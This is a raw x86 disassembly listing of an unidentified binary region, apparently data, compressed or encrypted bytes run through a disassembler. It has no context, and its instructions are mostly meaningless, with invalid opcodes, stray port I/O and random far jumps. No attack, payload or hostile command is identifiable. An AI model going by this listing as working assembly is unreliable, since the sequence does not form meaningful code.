  40575b:	xlat   BYTE PTR ds:[ebx]
  40575c:	rol    DWORD PTR [edx-0x3],0x76
  405760:	in     eax,dx
  405761:	dec    eax
  405762:	pop    esp
  405763:	and    al,0x6f
  405765:	std    
  405766:	pop    ss
  405767:	add    BYTE PTR [ecx-0x52],0x81
  40576b:	add    BYTE PTR [eax-0x669efa7c],dl
  405771:	pop    esi
  405772:	add    esi,DWORD PTR [ebx+esi*1-0xc]
  405776:	ror    DWORD PTR [eax-0x25ed92d],1
  40577c:	pop    ebp
  40577d:	adc    DWORD PTR [ebx+ecx*1+0x16],esp
  405781:	daa    
  405782:	sbb    BYTE PTR [ebx],bh
  405784:	fld    QWORD PTR [edx]
  405786:	bound  esp,QWORD PTR [esi]
  405788:	adc    ch,BYTE PTR [edx]
  40578a:	gs xchg ebp,eax
  40578c:	lock repz xchg edx,eax
  40578f:	test   al,0x19
  405791:	fild   WORD PTR [ecx-0x2d]
  405794:	or     edx,DWORD PTR [eax]
  405796:	xchg   ebp,eax
  405797:	mov    ds:0xbd57e695,al
  40579c:	out    0xd9,eax
  40579e:	js     0x40579f
  4057a0:	mov    edx,0x7cb9f64e
  4057a5:	or     BYTE PTR [edi-0x64],dl
  4057a8:	and    edx,DWORD PTR [ebx-0x40]
  4057ab:	xlat   BYTE PTR ds:[ebx]
  4057ac:	lods   eax,DWORD PTR ds:[esi]
  4057ad:	js     0x4057a7
  4057af:	ret    
  4057b0:	lods   eax,DWORD PTR ds:[esi]
  4057b1:	sbb    DWORD PTR [eax-0x6d],esp
  4057b4:	ret    
  4057b5:	pop    ebx
  4057b6:	fimul  DWORD PTR ds:0x3f5e0593
  4057bc:	stc    
  4057bd:	in     al,0x82
  4057bf:	repz adc BYTE PTR [edx],ah
  4057c2:	inc    eax
  4057c3:	jmp    0x405830
  4057c5:	mov    ds:0x4546871,eax
  4057ca:	and    DWORD PTR [esp+ebp*2],esi
  4057cd:	into   
  4057ce:	mov    ah,0xf8
  4057d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057d1:	dec    edx
  4057d2:	inc    edi
  4057d3:	xchg   ecx,eax
  4057d4:	leave  
  4057d5:	adc    al,0xac
  4057d7:	adc    eax,0x8b88459c
  4057dc:	or     al,0x36
  4057de:	and    al,0xe
  4057e0:	mov    ecx,0x3c6a23f4
  4057e5:	rcr    DWORD PTR [eax],cl
  4057e7:	ror    al,0xad
  4057ea:	shl    DWORD PTR [edi],0xc1
  4057ed:	or     BYTE PTR [ecx+0x17fcf4af],dl
  4057f3:	pop    esp
  4057f4:	call   0xfb278250
  4057f9:	imul   ecx,DWORD PTR [ebx-0xc],0xdaa55df8
  405800:	(bad)  
  405801:	aaa    
  405802:	jge    0x4057a9
  405804:	bswap  esi
  405806:	in     al,dx
  405807:	sub    edi,DWORD PTR [eax+0x17]
  40580a:	dec    edx
  40580b:	xchg   esi,ecx
  40580d:	mov    ecx,0xfd81a68c
  405812:	cld    
  405813:	(bad)
  405817:	outs   dx,DWORD PTR ds:[esi]
  405818:	aaa    
  405819:	outs   dx,DWORD PTR ds:[esi]
  40581a:	inc    eax
  40581b:	xor    DWORD PTR [edx],ebp
  40581d:	push   cs
  40581e:	fstp   QWORD PTR [ebx]
  405820:	(bad)  
  405821:	call   0x34f3:0x85a1f1e6
  405828:	dec    edx
  405829:	xchg   edx,eax
  40582a:	int    0xfd
  40582c:	scas   eax,DWORD PTR es:[edi]
  40582d:	shl    DWORD PTR [ebx+0x63],cl
  405830:	push   eax
  405831:	pop    edi
  405832:	xchg   edx,eax
  405833:	fst    DWORD PTR [esi]
  405835:	dec    esi
  405836:	xchg   esp,eax
  405837:	or     eax,0x6744fe29
  40583c:	scas   al,BYTE PTR es:[edi]
  40583d:	les    esp,FWORD PTR [ebp+0x1d]
  405840:	nop
  405841:	mov    bp,si
  405844:	cmp    ecx,DWORD PTR [ebp+0x1a]
  405847:	lahf   
  405848:	sub    eax,0xc2f00d43
  40584d:	or     eax,DWORD PTR [edi-0x446a41c]
  405853:	xor    BYTE PTR [edx-0x72],dl
  405856:	and    BYTE PTR [ecx-0x447b0cb2],bh
  40585c:	inc    ebx
  40585d:	sub    al,0x82
  40585f:	int    0x77
  405861:	mov    dl,0x56
  405863:	pop    ebx
  405864:	mov    ah,0xb0
  405866:	(bad)  
  405867:	data16 and BYTE PTR [edi],bh
  40586a:	pusha  
  40586b:	fistp  DWORD PTR [edi-0x11a23e7e]
  405871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405872:	add    al,0xa3
  405874:	inc    edx
  405875:	mov    dh,0x55
  405877:	mov    edx,0xcd8d4203
  40587c:	je     0x405801
  40587e:	test   al,0x81
  405880:	or     ebp,ebx
  405882:	hlt    
  405883:	cmp    eax,0xe559ff40
  405888:	aam    0x28
  40588a:	fistp  WORD PTR [edx+0x13]
  40588d:	adc    al,0xa
  40588f:	xchg   esp,eax
  405890:	pop    edx
  405891:	push   edi
  405892:	mov    BYTE PTR [edi+edx*4],al
  405895:	in     eax,0x89
  405897:	jbe    0x4058de
  405899:	clc    
  40589a:	add    BYTE PTR [edx+0x4e09fb06],cl
  4058a0:	pop    ds
  4058a1:	pop    esp
  4058a2:	and    bl,BYTE PTR [ebp+0x17ca1f87]
  4058a8:	or     eax,0x93f1ed3f
  4058ad:	(bad)  
  4058ae:	cwde   
  4058af:	jge    0x4058f9
  4058b1:	xchg   ebx,eax
  4058b2:	push   esi
  4058b3:	leave  
  4058b4:	cwde   
  4058b5:	ja     0x4058a5
  4058b7:	js     0x4058fd
  4058b9:	dec    edx
  4058ba:	adc    bh,bh
  4058bc:	or     al,0xfb
  4058be:	and    al,0x7
  4058c0:	adc    eax,0x3d3b34d
  4058c5:	pop    esi
  4058c6:	test   DWORD PTR [ecx-0x6f5bfc64],0x67d0aaa5
  4058d0:	push   eax
  4058d1:	js     0x40593e
  4058d3:	lods   al,BYTE PTR ds:[esi]
  4058d4:	(bad)  
  4058d5:	js     0x4058d1
  4058d7:	jp     0x405864
  4058d9:	inc    ecx
  4058da:	call   0xc60885f0
  4058df:	pop    edi
  4058e0:	sub    al,BYTE PTR [esi+0x42150eac]
  4058e6:	xchg   esi,eax
  4058e7:	frstor [edi+0x88999d4]
  4058ed:	push   ebp
  4058ee:	mov    eax,ds:0x8baed112
  4058f4:	std    
  4058f5:	sbb    ebx,edi
  4058f7:	adc    eax,0x4d341c0c
  4058fc:	es mov edi,0x36f38eb9
  405902:	mov    edi,0x9d85fd22
  405907:	xchg   ebx,eax
  405908:	fimul  DWORD PTR [edx-0x49465852]
  40590e:	jg     0x4058bc
  405910:	test   al,0x73
  405912:	sub    ch,0x67
  405915:	xlat   BYTE PTR ds:[ebx]
  405916:	sti    
  405917:	jecxz  0x405900
  405919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40591a:	lods   al,BYTE PTR ds:[esi]
  40591b:	fdivr  st(4),st
  40591d:	mov    esp,0xa4add138
  405922:	das    
  405923:	bound  esp,QWORD PTR [ebp+0x73e6de07]
  405929:	add    edi,DWORD PTR [edi]
  40592b:	add    ebp,DWORD PTR [esi-0x71]
  40592e:	stos   BYTE PTR es:[edi],al
  40592f:	sahf   
  405930:	test   ah,cl
  405932:	(bad)  
  405933:	sbb    al,0xd6
  405935:	xchg   ecx,eax
  405936:	(bad)  
  405937:	arpl   WORD PTR ds:0x2056a0ab,si
  40593d:	jmp    0x4058de
  40593f:	and    al,BYTE PTR [esp+esi*8-0x16]
  405943:	cwde   
  405944:	sub    cl,BYTE PTR [ebx-0x77aef4e3]
  40594a:	test   BYTE PTR ds:0x79ae97e8,dh
  405950:	sti    
  405951:	mov    WORD PTR [edx-0x5ce8516a],?
  405957:	dec    edx
  405958:	jmp    0x405960
  40595a:	gs jnp 0x405979
  40595d:	rcr    edx,1
  40595f:	out    dx,eax
  405960:	adc    al,0xb2
  405962:	dec    eax
  405963:	sub    dh,BYTE PTR [edx]
  405965:	mov    edi,0xca92c48e
  40596a:	popf   
  40596b:	in     al,0x85
  40596d:	loope  0x40593b
  40596f:	jle    0x405949
  405971:	and    dh,BYTE PTR [edx+edi*4+0x68]
  405975:	cmp    ebp,DWORD PTR [esi+ebx*2-0x3f3eaa3d]
  40597c:	imul   esp,DWORD PTR [ebp+eiz*8-0x2],0x71
  405981:	int3   
  405982:	stos   DWORD PTR es:[edi],eax
  405983:	call   0xef1b19c7
  405988:	xchg   esp,eax
  405989:	adc    eax,0xce22c8f8
  40598e:	inc    edi
  40598f:	xchg   ebp,eax
  405990:	test   eax,0xafa2ec8d
  405995:	int    0xa7
  405997:	call   0x44b5:0xd61e6841
  40599e:	mul    BYTE PTR [edi+0x711cca7e]
  4059a4:	push   cs
  4059a5:	sub    BYTE PTR [edi+edx*1],bh
  4059a8:	push   ecx
  4059a9:	xlat   BYTE PTR ds:[ebx]
  4059aa:	adc    DWORD PTR [ebx],ecx
  4059ac:	fdivr  DWORD PTR [esi-0x65aabd68]
  4059b2:	xchg   ebx,eax
  4059b3:	scas   eax,DWORD PTR es:[edi]
  4059b4:	adc    DWORD PTR [ebp-0x19],esi
  4059b7:	out    0xc9,al
  4059b9:	out    dx,al
  4059ba:	mov    eax,0xc9ae1d71
  4059bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059c0:	mul    BYTE PTR [esi-0x4c]
  4059c3:	stos   DWORD PTR es:[edi],eax
  4059c4:	sbb    BYTE PTR [ebp+0x14b5d9b9],0x57
  4059cb:	sub    BYTE PTR [ebp+0x23a9821b],al
  4059d1:	ret    0xb59
  4059d4:	jbe    0x405a3c
  4059d6:	pop    edx
  4059d7:	sub    DWORD PTR [ecx-0x883a6d7],esi
  4059dd:	sub    al,0x77
  4059df:	enter  0x6ad7,0x4f
  4059e3:	out    0xf6,eax
  4059e5:	push   esp
  4059e6:	cwde   
  4059e7:	xchg   BYTE PTR [ecx+0x25],dh
  4059ea:	shl    DWORD PTR [ecx+0x6e15ec6b],1
  4059f0:	mov    WORD PTR [esi],ds
  4059f2:	add    eax,0xa2b8a17d
  4059f7:	cmp    esi,DWORD PTR [esi]
  4059f9:	test   al,0xa9
  4059fb:	dec    esp
  4059fc:	out    dx,al
  4059fd:	mov    bl,0xdf
  4059ff:	or     ch,BYTE PTR [ebx+0x43]
  405a02:	addr16 dec ecx
  405a04:	pop    ss
  405a05:	int    0x9c
  405a07:	and    bh,BYTE PTR [esi+ebx*8+0x4]
  405a0b:	mov    dl,0x90
  405a0d:	pop    eax
  405a0e:	jp     0x405a29
  405a10:	sub    dl,ch
  405a12:	sbb    eax,0x8ebe9d7a
  405a17:	push   0xfffffff8
  405a19:	inc    edi
  405a1a:	push   ds
  405a1b:	pop    ebp
  405a1c:	lea    ecx,[edx-0x5e]
  405a1f:	dec    ebp
  405a20:	out    dx,eax
  405a21:	or     DWORD PTR [ecx-0x59a92614],ecx
  405a27:	xchg   bl,dl
  405a29:	test   bh,dh
  405a2b:	xchg   ebx,eax
  405a2c:	push   0xffffffd9
  405a2e:	pop    es
  405a2f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a31:	mov    ds:0x6c8f4bef,eax
  405a36:	retf   
  405a37:	mov    dh,0xc9
  405a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a3a:	lock add edx,DWORD PTR [ebp+0x42]
  405a3e:	lds    edx,FWORD PTR [eax+0x7df71534]
  405a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a45:	sbb    DWORD PTR [ebp-0x38],ebx
  405a48:	jg     0x4059d3
  405a4a:	lahf   
  405a4b:	(bad)  
  405a4c:	cli    
  405a4d:	pop    edi
  405a4e:	push   0x2e729a7f
  405a53:	inc    ebx
  405a54:	adc    dl,dh
  405a56:	and    esi,ecx
  405a58:	fisubr DWORD PTR [ebx+0x5bc1ba89]
  405a5e:	jl     0x405a76
  405a60:	sub    DWORD PTR [esi+0x33],esp
  405a63:	nop
  405a64:	or     ebx,esi
  405a66:	inc    ebp
  405a67:	lahf   
  405a68:	stos   BYTE PTR es:[edi],al
  405a69:	push   edx
  405a6a:	jl     0x405a6e
  405a6c:	mov    ecx,0x88ea80f9
  405a71:	pop    es
  405a72:	dec    ecx
  405a73:	scas   eax,DWORD PTR es:[edi]
  405a74:	sub    BYTE PTR [eax],ch
  405a76:	add    eax,0xd6419c8
  405a7b:	nop
  405a7c:	xchg   esp,eax
  405a7d:	fcomp  QWORD PTR [edx-0x1a]
  405a80:	adc    al,0x29
  405a82:	sub    eax,0xab0e2e0e
  405a87:	dec    ecx
  405a88:	mov    ds:0xe55a52ab,al
  405a8d:	lahf   
  405a8e:	mov    dh,dl
  405a90:	fadd   DWORD PTR [edi-0x76]
  405a93:	popf   
  405a94:	fscale 
  405a96:	xchg   esp,eax
  405a97:	out    dx,eax
  405a98:	jnp    0x405a2e
  405a9a:	xor    DWORD PTR [ebx-0x48],ecx
  405a9d:	xchg   BYTE PTR [ecx],ah
  405a9f:	addr16 dec ebx
  405aa1:	ret    0xe3c6
  405aa4:	mov    WORD PTR [ebp-0x22],?
  405aa7:	jbe    0x405aa8
  405aa9:	imul   esi,DWORD PTR [edx+0x1b],0xca3132bd
  405ab0:	stc    
  405ab1:	xor    BYTE PTR [eax+0x39cf2052],al
  405ab7:	clc    
  405ab8:	adc    ecx,0xbf997873
  405abe:	gs ret 
  405ac0:	rol    DWORD PTR [ebx],cl
  405ac2:	jecxz  0x405a4c
  405ac4:	and    eax,0x69be9825
  405ac9:	imul   edi,DWORD PTR [ebx],0x22
  405acc:	pop    esp
  405acd:	mov    al,0xb0
  405acf:	not    BYTE PTR [ebx-0x749bc28d]
  405ad5:	mov    ebx,0x5295a1e6
  405ada:	inc    ebp
  405adb:	pop    esp
  405adc:	idiv   DWORD PTR [ebp-0x4060a129]
  405ae2:	cdq    
  405ae3:	sub    BYTE PTR [edx-0xe],dl
  405ae6:	jmp    0x67e8:0x2a0bd246
  405aed:	or     BYTE PTR [ebp+0x52],dl
  405af0:	adc    eax,0x41c294d3
  405af5:	jmp    0x405aeb
  405af7:	shl    BYTE PTR [ecx+0x1],cl
  405afa:	stos   BYTE PTR es:[edi],al
  405afb:	pop    ss
  405afc:	mov    esp,0xe5571a49
  405b01:	leave  
  405b02:	xchg   ebx,eax
  405b03:	retf   0x4b80
  405b06:	jns    0x405a91
  405b08:	sub    edi,0x45d8286d
  405b0e:	(bad)  
  405b0f:	daa    
  405b10:	ss popf 
  405b12:	dec    ecx
  405b13:	cmp    edi,esi
  405b15:	(bad)  
  405b16:	ins    DWORD PTR es:[edi],dx
  405b17:	fdecstp 
  405b19:	rcr    DWORD PTR [eax+edx*8+0x53],0xce
  405b1e:	or     esp,edi
  405b20:	cld    
  405b21:	aas    
  405b22:	pop    ds
  405b23:	rcr    DWORD PTR [ecx+0x62],0x34
  405b27:	mov    cl,0x50
  405b29:	fwait
  405b2a:	cli    
  405b2b:	sub    bl,BYTE PTR [edi]
  405b2d:	sbb    cl,dl
  405b2f:	nop
  405b30:	dec    eax
  405b31:	dec    edi
  405b32:	xchg   ebx,eax
  405b33:	sbb    eax,0x3f413554
  405b38:	scas   al,BYTE PTR es:[edi]
  405b39:	iret   
  405b3a:	mov    eax,ds:0xde158f59
  405b3f:	cmp    eax,0xd1836658
  405b44:	stos   DWORD PTR es:[edi],eax
  405b45:	mov    cl,0xa6
  405b47:	enter  0xa0c7,0x34
  405b4b:	xchg   esi,eax
  405b4c:	cmp    esi,ebx
  405b4e:	push   esi
  405b4f:	xchg   edi,eax
  405b50:	gs mov ebp,0x96c565e1
  405b56:	push   esp
  405b57:	jbe    0x405b4f
  405b59:	xchg   edx,eax
  405b5a:	out    0x57,al
  405b5c:	cmp    al,0x2
  405b5e:	clc    
  405b5f:	dec    esi
  405b60:	(bad)  
  405b61:	mov    ah,0xd3
  405b63:	arpl   WORD PTR [ebx+0x77c93534],bx
  405b69:	adc    DWORD PTR [eax+0x2ee9a71f],edi
  405b6f:	retf   0x8d52
  405b72:	xor    eax,0xf790310d
  405b77:	sub    eax,0xc226e12
  405b7c:	js     0x405b65
  405b7e:	mov    WORD PTR [esp+edx*1],?
  405b81:	into   
  405b82:	and    ch,BYTE PTR [ecx-0x63]
  405b85:	ins    DWORD PTR es:[edi],dx
  405b86:	jp     0x405be3
  405b88:	out    dx,eax
  405b89:	jo     0x405ba3
  405b8b:	cs fs mov ch,0xfc
  405b8f:	push   esp
  405b90:	push   esp
  405b91:	imul   eax,DWORD PTR [eax],0xf1c13d12
  405b97:	aas    
  405b98:	xchg   esi,eax
  405b99:	xor    ecx,esi
  405b9b:	sbb    eax,0x8a6b39c0
  405ba0:	sti    
  405ba1:	pusha  
  405ba2:	or     BYTE PTR [ebx+0x39],0xac
  405ba6:	mov    cl,0x26
  405ba8:	mov    ch,0x88
  405baa:	scas   al,BYTE PTR es:[edi]
  405bab:	cmp    edi,DWORD PTR [edx-0x4de7de2c]
  405bb1:	mov    eax,ds:0x1faa6863
  405bb6:	or     edx,edi
  405bb8:	cmp    eax,ecx
  405bba:	mov    esp,0xa6ff7237
  405bbf:	or     esi,DWORD PTR [ecx-0x57]
  405bc2:	jecxz  0x405c42
  405bc4:	in     eax,0x75
  405bc6:	sub    esi,DWORD PTR [esi+0x6bd5c9ed]
  405bcc:	bound  esi,QWORD PTR [eax+0x3b]
  405bcf:	push   esi
  405bd0:	sub    DWORD PTR [edx+0x36511eec],edx
  405bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd7:	es pop edi
  405bd9:	mov    ds:0x5d63ed49,eax
  405bde:	sub    al,0x49
  405be0:	pop    esp
  405be1:	sbb    ebp,DWORD PTR [edi+0x4b]
  405be4:	inc    edx
  405be5:	cli    
  405be6:	aam    0x0
  405be8:	or     bh,BYTE PTR [edi]
  405bea:	mov    ebx,0xabd3f2f7
  405bf0:	mov    BYTE PTR [edi+0x55c9d5da],0xd2
  405bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bf8:	cmp    DWORD PTR [edx-0x15294aca],esp
  405bfe:	iret   
  405bff:	js     0x405c50
  405c01:	dec    esi
  405c02:	xor    BYTE PTR [edx+0x14],ah
  405c05:	jb     0x405c78
  405c07:	aam    0x99
  405c09:	repnz xor DWORD PTR [ecx-0x5909b080],esi
  405c10:	loope  0x405c53
  405c12:	std    
  405c13:	add    BYTE PTR [edi-0x53],0x9b
  405c17:	jp     0x405bdd
  405c19:	loopne 0x405bb7
  405c1b:	mov    esp,DWORD PTR [ebp-0x1ac8881d]
  405c21:	rcl    BYTE PTR [ebx-0x10],1
  405c24:	xchg   edi,eax
  405c25:	iret   
  405c26:	sar    DWORD PTR [ebp+0x23],cl
  405c29:	dec    ecx
  405c2a:	mov    bh,0x8f
  405c2c:	les    edx,FWORD PTR [ebx-0x6]
  405c2f:	lea    ecx,[ecx+0x40380617]
  405c35:	fsub   st,st(3)
  405c37:	xchg   edx,eax
  405c38:	push   ecx
  405c39:	stos   BYTE PTR es:[edi],al
  405c3a:	cmc    
  405c3b:	cdq    
  405c3c:	sub    bh,BYTE PTR [ecx-0x10]
  405c3f:	pop    esi
  405c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c41:	xor    DWORD PTR [esp+ebp*4-0x2f],0x6d46229a
  405c49:	xor    ebp,DWORD PTR ds:0x80d0631a
  405c4f:	bound  esp,QWORD PTR [edx-0x3e]
  405c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c53:	retf   
  405c54:	dec    eax
  405c55:	jno    0x405c17
  405c57:	dec    esp
  405c58:	ds out dx,al
  405c5a:	cwde   
  405c5b:	rcl    DWORD PTR [ebx+0x6e],cl
  405c5e:	in     eax,0x33
  405c60:	cmp    bl,cl
  405c62:	ins    DWORD PTR es:[edi],dx
  405c63:	mov    eax,ebp
  405c65:	mov    ch,0xf8
  405c67:	mov    ch,BYTE PTR [ebx]
  405c69:	cmp    ebp,DWORD PTR ds:0x1f83ead6
  405c6f:	(bad)  
  405c70:	mov    dh,0xf9
  405c72:	into   
  405c73:	sbb    BYTE PTR [edi+eiz*8],bh
  405c76:	ds mov ebx,0xe6a45af3
  405c7c:	sahf   
  405c7d:	sahf   
  405c7e:	cmp    DWORD PTR [esi],edi
  405c80:	in     eax,0x6
  405c82:	mov    eax,0x1089624
  405c87:	jg     0x405cef
  405c89:	push   edi
  405c8a:	xchg   ebx,eax
  405c8b:	xor    eax,0xa3f73a5e
  405c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c92:	xor    eax,0x70e114dc
  405c97:	lock jl 0x405c6c
  405c9a:	adc    esi,edi
  405c9c:	inc    ebp
  405c9d:	inc    esp
  405c9e:	popf   
  405c9f:	push   0x97c97026
  405ca4:	loop   0x405c91
  405ca6:	or     esp,ebx
  405ca8:	call   0x76e60a8f
  405cad:	idiv   DWORD PTR [edx]
  405caf:	jbe    0x405c4e
  405cb1:	push   ds
  405cb2:	retf   
  405cb3:	push   es
  405cb4:	fnstsw WORD PTR [ecx+eax*4+0x55]
  405cb8:	(bad)  
  405cba:	ror    BYTE PTR [ebx-0x33],cl
  405cbd:	xchg   ecx,eax
  405cbe:	jmp    0x9845d45f
  405cc3:	pop    ss
  405cc4:	push   ebx
  405cc5:	adc    esi,DWORD PTR [esi-0x78fd8e3]
  405ccb:	mov    ds:0x79bb5f4f,al
  405cd0:	mov    cl,0x34
  405cd2:	pop    ebx
  405cd3:	xlat   BYTE PTR ds:[ebx]
  405cd4:	mov    edx,0xc6412226
  405cd9:	shr    DWORD PTR [edx-0x277542fb],1
  405cdf:	add    ebp,DWORD PTR [eax+eax*1-0x2cccadd5]
  405ce6:	sbb    DWORD PTR [ebx],esp
  405ce8:	mov    ecx,0x819bb297
  405ced:	mov    DWORD PTR ds:0xd87fa6f7,edi
  405cf3:	mov    ds,WORD PTR [ecx-0x6a9b21be]
  405cf9:	xchg   edi,eax
  405cfa:	pop    edi
  405cfb:	xchg   edx,eax
  405cfc:	mov    bh,0x58
  405cfe:	sub    BYTE PTR [edx-0x2],dh
  405d01:	gs (bad) 
  405d03:	jo     0x405ca8
  405d05:	push   cs
  405d06:	and    eax,0x69a0e57d
  405d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d0c:	push   ss
  405d0d:	jns    0x405d65
  405d0f:	sub    BYTE PTR [esi-0x4f3371a9],ah
  405d15:	sbb    eax,0xd0d65415
  405d1a:	je     0x405d8d
  405d1c:	outs   dx,DWORD PTR ds:[esi]
  405d1d:	stos   BYTE PTR es:[edi],al
  405d1e:	mov    eax,0xfabcebba
  405d23:	mov    ebx,0xb6e866ab
  405d28:	ins    DWORD PTR es:[edi],dx
  405d29:	in     al,0x63
  405d2b:	aam    0x56
  405d2d:	sbb    esi,DWORD PTR [ecx-0xa]
  405d30:	loope  0x405da5
  405d32:	(bad)  
  405d33:	xor    bl,BYTE PTR [edx]
  405d35:	mov    edx,DWORD PTR [edi-0x1877d955]
  405d3b:	imul   eax,DWORD PTR [ebp-0x5f],0x28c1c16d
  405d42:	leave  
  405d43:	xchg   ebp,eax
  405d44:	daa    
  405d45:	sbb    DWORD PTR [eax+0x52],ebp
  405d48:	daa    
  405d49:	iret   
  405d4a:	jecxz  0x405d4d
  405d4c:	inc    ecx
  405d4d:	mov    ah,0x75
  405d4f:	cs dec esi
  405d51:	test   BYTE PTR [esi],ah
  405d53:	dec    ecx
  405d54:	lock mov eax,ds:0xa5a90003
  405d5a:	into   
  405d5b:	dec    ecx
  405d5c:	or     dh,BYTE PTR [edi-0x1642c04a]
  405d62:	scas   al,BYTE PTR es:[edi]
  405d63:	imul   ebx,ecx,0x26
  405d66:	(bad)  
  405d67:	aas    
  405d68:	push   es
  405d69:	pop    esp
  405d6a:	cs inc eax
  405d6c:	push   edi
  405d6d:	cmp    eax,0x2d565590
  405d72:	inc    esp
  405d73:	loope  0x405d89
  405d75:	popa   
  405d76:	fsub   QWORD PTR [ecx+0x47b5abe2]
  405d7c:	std    
  405d7d:	adc    al,ch
  405d7f:	and    edi,ebp
  405d81:	test   DWORD PTR [edi-0x6],eax
  405d84:	aad    0x1f
  405d86:	div    DWORD PTR [ecx]
  405d88:	jl     0x405d8e
  405d8a:	inc    esi
  405d8b:	(bad)  
  405d8c:	int3   
  405d8d:	enter  0x42d9,0x50
  405d91:	xlat   BYTE PTR ds:[ebx]
  405d92:	jae    0x405d7d
  405d94:	aas    
  405d95:	sahf   
  405d96:	aam    0xfa
  405d98:	xor    eax,0xa61204b4
  405d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d9e:	(bad)  
  405d9f:	jge    0x405e17
  405da1:	icebp  
  405da2:	in     eax,0xa0
  405da4:	jle    0x405de8
  405da6:	xchg   ebp,eax
  405da7:	cmp    eax,0x823d60e9
  405dac:	imul   edx,DWORD PTR [edx-0x32],0xbfe554f6
  405db3:	sbb    edx,0xbbaba19d
  405db9:	fild   WORD PTR [edi]
  405dbb:	jg     0x405e1a
  405dbd:	and    BYTE PTR [ebx+0x3545974f],ah
  405dc3:	(bad)  
  405dc5:	ins    BYTE PTR es:[edi],dx
  405dc6:	icebp  
  405dc7:	sbb    DWORD PTR [eax*4+0x4342e1c9],0x2a
  405dcf:	mov    dl,0xce
  405dd1:	outs   dx,DWORD PTR ds:[esi]
  405dd2:	mov    bl,0x30
  405dd4:	seto   BYTE PTR [edi]
  405dd7:	xor    DWORD PTR [esi-0x7fcd3e2a],ebp
  405ddd:	dec    ecx
  405dde:	sahf   
  405ddf:	js     0x405dce
  405de1:	out    dx,al
  405de2:	das    
  405de3:	call   0xaa91:0x895978e1
  405dea:	dec    edi
  405deb:	lods   al,BYTE PTR ds:[esi]
  405dec:	dec    ebp
  405ded:	cmp    eax,0x6ed0c354
  405df2:	inc    ebp
  405df3:	loopne 0x405db4
  405df5:	rol    ebp,cl
  405df7:	xor    BYTE PTR [esi+edi*8],dl
  405dfa:	jb     0x405d92
  405dfc:	scas   eax,DWORD PTR es:[edi]
  405dfd:	rcl    BYTE PTR [ebx+0x52829ae4],cl
  405e03:	sbb    bl,BYTE PTR [ebp+0x74184218]
  405e09:	and    al,0xa6
  405e0b:	xor    eax,DWORD PTR [ebx]
  405e0d:	push   0xbb828a0b
  405e12:	xor    bh,al
  405e14:	xor    al,0x4e
  405e16:	push   edx
  405e17:	pop    esp
  405e18:	sbb    al,0x9f
  405e1a:	add    BYTE PTR [ebx+0xdb84db],0xfb
  405e21:	xor    DWORD PTR [ebx],ebx
  405e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e24:	push   edx
  405e25:	xor    DWORD PTR [edx-0x651762ff],ecx
  405e2b:	adc    dl,BYTE PTR [edx]
  405e2d:	or     eax,0x482b09d4
  405e32:	mov    al,BYTE PTR [ebx]
  405e34:	mov    esp,0xfb312019
  405e39:	stos   BYTE PTR es:[edi],al
  405e3a:	add    bl,BYTE PTR [eax]
  405e3c:	adc    BYTE PTR [esp+ecx*4],bh
  405e3f:	jg     0x405e49
  405e41:	cdq    
  405e42:	mov    esp,0xe6e52555
  405e47:	aam    0x8e
  405e49:	jb     0x405dfb
  405e4b:	or     esp,DWORD PTR [edx-0x58]
  405e4e:	xor    DWORD PTR [ebx+0x34],edi
  405e51:	xlat   BYTE PTR ds:[ebx]
  405e52:	clc    
  405e53:	dec    ebx
  405e54:	imul   ebx,DWORD PTR [eax+0x58ba0f5],0x5c
  405e5b:	stos   BYTE PTR es:[edi],al
  405e5c:	shr    DWORD PTR [ebx-0x31],1
  405e5f:	sbb    BYTE PTR fs:[ecx+esi*4],0xd9
  405e64:	pop    ecx
  405e65:	push   edx
  405e66:	ja     0x405e37
  405e68:	ror    BYTE PTR [eax-0x1d155a0f],1
  405e6e:	call   0x70d6:0xe4352f1c
  405e75:	retf   0x7851
  405e78:	pop    edx
  405e79:	loop   0x405e09
  405e7b:	mov    ah,0x5d
  405e7d:	loope  0x405ecc
  405e7f:	push   es
  405e80:	adc    DWORD PTR [ebp+esi*2+0x24fa1777],esp
  405e87:	mov    ch,0x80
  405e89:	push   0xe94b80e0
  405e8e:	cmp    eax,DWORD PTR [esi-0x5a5114d1]
  405e94:	test   eax,0xe4b4bfc0
  405e99:	add    BYTE PTR es:[ebx+0x194d2b2d],dh
  405ea0:	clc    
  405ea1:	xor    esp,esi
  405ea3:	mov    ecx,0xfdcdcb71
  405ea8:	add    BYTE PTR [eax-0x5a706948],bl
  405eae:	gs shl ebx,cl
  405eb1:	xor    BYTE PTR [edi],dl
  405eb3:	loop   0x405e7c
  405eb5:	xchg   edx,eax
  405eb6:	mov    bh,0x49
  405eb8:	pop    edi
  405eb9:	frstor [edx]
  405ebb:	(bad)  
  405ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ebd:	push   ss
  405ebe:	int3   
  405ebf:	call   0x5dd1:0x76446cb9
  405ec6:	add    eax,0xee5785a1
  405ecb:	icebp  
  405ecc:	push   ecx
  405ecd:	inc    ebx
  405ece:	gs retf 0x135b
  405ed2:	test   ecx,eax
  405ed4:	xor    eax,0xf87eeb47
  405ed9:	dec    eax
  405eda:	pop    edx
  405edb:	int    0x1a
  405edd:	(bad)  
  405ede:	cld    
  405edf:	in     eax,dx
  405ee0:	imul   edi,edi,0xffffff9f
  405ee3:	nop
  405ee4:	into   
  405ee5:	add    esi,ebx
  405ee7:	sub    BYTE PTR [edx+0x73f72963],cl
  405eed:	mov    esi,0x5f6306b5
  405ef2:	in     eax,0x5f
  405ef4:	jp     0x405f4a
